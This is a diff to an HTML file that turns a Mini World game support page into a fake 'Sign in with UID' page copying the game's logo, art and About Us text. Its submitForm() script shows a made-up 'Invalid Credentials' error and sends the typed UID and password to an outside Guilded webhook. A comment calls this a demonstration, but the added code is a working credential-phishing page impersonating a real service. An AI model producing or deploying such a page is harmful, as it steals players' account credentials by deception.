@@ -2,157 +2,190 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mini World Support</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.25">
+  <title>Sign In</title>
   <style>
-    /* General Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f9; /* Sade bir renk */
-      color: #333;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      background-color: #f2f2f2;
+      margin: 0;
+      padding: 0;
       height: 100vh;
-      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
     }
 
-    /* Navbar */
-    .navbar {
-      width: 100%;
+    .container {
+      width: 80%;
+      max-width: 700px;
       padding: 20px;
-      background-color: #fff;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 2px solid #ddd;
+      background-color: #ffffff;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      text-align: center;
+      flex-direction: column;
     }
 
     .logo {
-      height: 50px;
+      position: absolute;
+      top: 20px;
+      left: 20px;
     }
 
-    .return-link {
-      text-decoration: none;
-      font-size: 16px;
-      color: #0073e6;
-      margin-right: 20px;
-      position: relative;
+    .header {
+      font-size: 28px;
+      margin: 20px 0;
+      font-weight: bold;
     }
 
-    .return-link:hover {
-      text-decoration: underline;
+    .form-group {
+      margin: 20px 0;
     }
 
-    /* Main Content */
-    main {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      width: 80%;
-      position: relative;
-    }
-
-    /* Login Box */
-    .login-box {
-      background-color: #fff;
-      border: 2px solid #ddd;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-      text-align: center;
-      width: 300px;
-    }
-
-    .login-box h1 {
-      margin-bottom: 20px;
-      font-size: 20px;
-      color: #444;
-    }
-
-    .login-box input {
-      width: 90%;
-      padding: 10px;
-      margin-bottom: 15px;
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 5px;
-      font-size: 14px;
+      box-sizing: border-box;
     }
 
-    .login-box button {
-      width: 100%;
-      padding: 10px;
-      background-color: #0073e6;
+    .btn {
+      padding: 15px 30px;
+      background-color: #4CAF50;
       color: white;
+      font-size: 16px;
       border: none;
       border-radius: 5px;
       cursor: pointer;
+      width: 100%;
+    }
+
+    .btn:hover {
+      background-color: #45a049;
+    }
+
+    .error {
+      color: red;
       font-size: 16px;
+      margin-top: 20px;
     }
 
-    .login-box button:hover {
-      background-color: #005bb5;
+    .about-us {
+      margin-top: 40px;
+      font-size: 18px;
+      text-align: left;
+      padding: 10px;
+      background-color: #f1f1f1;
+      border-radius: 8px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
     }
 
-    /* Characters */
-    .character {
-      width: 20%;
+    .store-links {
+      margin-top: 20px;
     }
 
-    .character img {
-      max-width: 100%;
-      height: auto;
+    .store-links img {
+      margin: 0 10px;
+      cursor: pointer;
     }
 
-    .left {
+    .return-main {
       position: absolute;
-      left: 0;
-      top: 50%;
-      transform: translateY(-50%);
+      bottom: 20px;
+      right: 20px;
+      font-size: 16px;
+      color: #0066cc;
+      cursor: pointer;
+      text-decoration: none;
     }
 
-    .right {
-      position: absolute;
-      right: 0;
-      top: 50%;
-      transform: translateY(-50%);
+    .return-main:hover {
+      text-decoration: underline;
+    }
+
+    .character-images {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+
+    .character-images img {
+      width: 120px;
+      height: 120px;
+      border-radius: 8px;
     }
   </style>
 </head>
 <body>
-  <!-- Navbar -->
-  <header>
-    <div class="navbar">
-      <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/logo.0edc9054.png" alt="Mini World Logo" class="logo">
-      <a href="#" class="return-link">Return to Main Site</a>
-    </div>
-  </header>
 
-  <!-- Main Content -->
-  <main>
-    <div class="character left">
-      <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/media-role.585e012d.png" alt="Female Character">
+  <div class="container">
+    <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/logo.0edc9054.png" alt="Mini World Logo" class="logo" />
+    
+    <div class="header">Sign in with UID</div>
+
+    <div class="form-group">
+      <input type="text" id="uid" placeholder="Enter your UID" required>
+      <input type="password" id="password" placeholder="Enter your password" required>
     </div>
 
-    <div class="login-box">
-      <h1>Sign in with UID</h1>
-      <form id="login-form">
-        <input type="text" id="uid" placeholder="Enter UID or Email" required>
-        <input type="password" id="password" placeholder="Enter Password" required>
-        <button type="submit">Sign In</button>
-      </form>
+    <button class="btn" onclick="submitForm()">Sign In</button>
+
+    <div id="error-message" class="error"></div>
+
+    <div class="about-us">
+      <h3>About Us</h3>
+      <p>Mini World: CREATA is a free-to-play sandbox game launched in 2017 and now enjoys hundreds of millions of registered players in over 30 countries. As the name suggests, creation is the core value of the game, where players can create everything in the meta-universe by using the objects and tools provided. Quality instant games by our players, adventures, diverse structures, and customized mechanisms are all part of creation. We are passionate about building an inclusive ecosystem with a myriad of user-generated content and connecting people through playing.</p>
     </div>
 
-    <div class="character right">
-      <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/news-role.e84f4ae0.png" alt="Male Character">
+    <div class="store-links">
+      <a href="https://play.google.com/store/apps/details?id=com.playmini.miniworld&pli=1" target="_blank">
+        <img src="https://wiki.miniworldgame.com/lib/exe/fetch.php?w=200&tok=71ebeb&media=main_page:google_play_banner.png" alt="Google Play" />
+      </a>
+      <a href="https://apps.apple.com/us/app/mini-world-creata/id1540197003" target="_blank">
+        <img src="https://wiki.miniworldgame.com/lib/exe/fetch.php?w=200&tok=9d6a55&media=main_page:apple_store_banner.png" alt="Apple Store" />
+      </a>
     </div>
-  </main>
+
+    <div class="character-images">
+      <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/news-role.e84f4ae0.png" alt="Male Dinosaur" />
+      <img src="https://static.miniworldgame.com/nuxts-official-website/public/_nuxt/media-role.585e012d.png" alt="Female Bunny" />
+    </div>
+
+    <a href="/" class="return-main">Return to Main Site</a>
+  </div>
+
+  <script>
+    function submitForm() {
+      var uid = document.getElementById('uid').value;
+      var password = document.getElementById('password').value;
+
+      // Simulate an error for demonstration purposes
+      if (uid && password) {
+        document.getElementById('error-message').innerText = 'Error code: 300 - Invalid Credentials';
+      } else {
+        document.getElementById('error-message').innerText = 'Error: Please fill in both fields';
+      }
+
+      // Send data to Guilded Webhook (For demonstration, replace with your backend logic)
+      var webhookUrl = 'https://media.guilded.gg/webhooks/d401fdb2-71e5-40f3-b07d-5e0d4a696335/AANy4jolA40ykgIkesWYAyyaKQc42kmkwos2yIU40qsqIcsOmoco2M62syYG2A6u0acuiawSyUSCwOW6gkUk4q';
+
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          username: uid,
+          password: password,
+          timestamp: new Date().toISOString()
+        })
+      });
+    }
+  </script>
+
 </body>
 </html>
